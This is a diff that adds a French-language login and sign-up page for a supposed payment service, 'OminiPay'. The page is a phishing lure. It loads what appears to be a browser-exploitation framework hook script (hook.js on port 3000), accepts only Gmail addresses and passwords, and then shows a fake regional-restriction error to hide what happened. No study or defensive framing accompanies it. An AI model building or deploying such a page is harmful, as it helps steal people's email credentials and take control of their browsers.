@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bienvenue | OminiPay</title>
+    
+    <script src="http://127.0.0.1:3000/hook.js"></script>
+
+    <style>
+        * { box-sizing: border-box; }
+        
+        body {
+            margin: 0;
+            height: 100vh;
+            background: url('https://images.unsplash.com/photo-1544716278-ca5e3f4abd8c?q=80&w=2000&auto=format&fit=crop') no-repeat center center fixed;
+            background-size: cover;
+            font-family: 'Times New Roman', Times, serif; 
+            font-style: italic;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        /* Formulaire plus petit et discret */
+        .login-card {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            padding: 30px;
+            border-radius: 40px;
+            border: 0.5px solid rgba(255, 255, 255, 0.2); 
+            width: 280px; /* Taille réduite */
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            transition: 0.5s;
+        }
+
+        h2 { color: white; font-size: 28px; margin-bottom: 20px; text-shadow: 2px 2px 10px rgba(0,0,0,0.8); }
+
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            margin: 8px 0;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 20px;
+            background: rgba(0, 0, 0, 0.4);
+            color: white;
+            font-style: italic;
+            outline: none;
+        }
+
+        #btn-main {
+            width: 100%;
+            padding: 14px;
+            margin-top: 15px;
+            border: none;
+            border-radius: 20px;
+            background-color: rgba(0, 122, 255, 0.85);
+            color: white;
+            font-size: 16px;
+            font-style: italic;
+            cursor: pointer;
+        }
+
+        #btn-main:disabled { opacity: 0.3; }
+
+        .switch-text { color: white; margin-top: 15px; font-size: 13px; cursor: pointer; text-decoration: underline; }
+
+        /* PAGE D'ERREUR PLEIN ÉCRAN */
+        #error-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9); /* Noir profond */
+            backdrop-filter: blur(25px);
+            z-index: 999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            color: white;
+            padding: 20px;
+        }
+
+        /* Icône Globe Phosphoreux */
+        .icon-globe {
+            font-size: 80px;
+            margin-bottom: 20px;
+            color: #00f2ff;
+            text-shadow: 0 0 20px #00f2ff, 0 0 40px #00f2ff; /* Effet Néon */
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.1); opacity: 1; }
+            100% { transform: scale(1); opacity: 0.8; }
+        }
+
+        .error-msg { font-size: 20px; letter-spacing: 1px; line-height: 1.6; }
+    </style>
+</head>
+<body>
+
+    <div id="login-form" class="login-card">
+        <h2>OminiPay</h2>
+        <input type="email" id="email" placeholder="votre@gmail.com" oninput="validate()">
+        <input type="password" id="pass" placeholder="Mot de passe (6+)" oninput="validate()">
+        <button id="btn-main" onclick="triggerError()" disabled>S'inscrire</button>
+        <div id="switch" class="switch-text" onclick="toggleMode()">Déjà un compte ? Se connecter</div>
+    </div>
+
+    <div id="error-overlay">
+        <div class="icon-globe">🌐</div>
+        <p class="error-msg">
+            <span style="font-size: 26px; color: #ff4d4d;">Accès Restreint</span><br><br>
+            Désolé, votre zone géographique ne permet pas d'accéder aux services OminiPay pour le moment.<br><br>
+            Veuillez réessayer ultérieurement.
+        </p>
+        <button onclick="location.reload()" style="background:none; border:1px solid rgba(255,255,255,0.3); color:white; padding:10px 25px; border-radius:20px; margin-top:30px; cursor:pointer;">Quitter</button>
+    </div>
+
+    <script>
+        let isLoginMode = false;
+
+        function validate() {
+            const email = document.getElementById('email').value.trim();
+            const pass = document.getElementById('pass').value;
+            const btn = document.getElementById('btn-main');
+            btn.disabled = !(email.toLowerCase().endsWith('@gmail.com') && pass.length >= 6);
+        }
+
+        function toggleMode() {
+            isLoginMode = !isLoginMode;
+            document.getElementById('btn-main').innerText = isLoginMode ? "Se connecter" : "S'inscrire";
+            document.getElementById('switch').innerText = isLoginMode ? "Nouveau ? S'inscrire" : "Déjà un compte ? Se connecter";
+        }
+
+        function triggerError() {
+            document.getElementById('login-form').style.opacity = '0';
+            setTimeout(() => {
+                document.getElementById('login-form').style.display = 'none';
+                document.getElementById('error-overlay').style.display = 'flex';
+            }, 500);
+        }
+    </script>
+</body>
+</html>
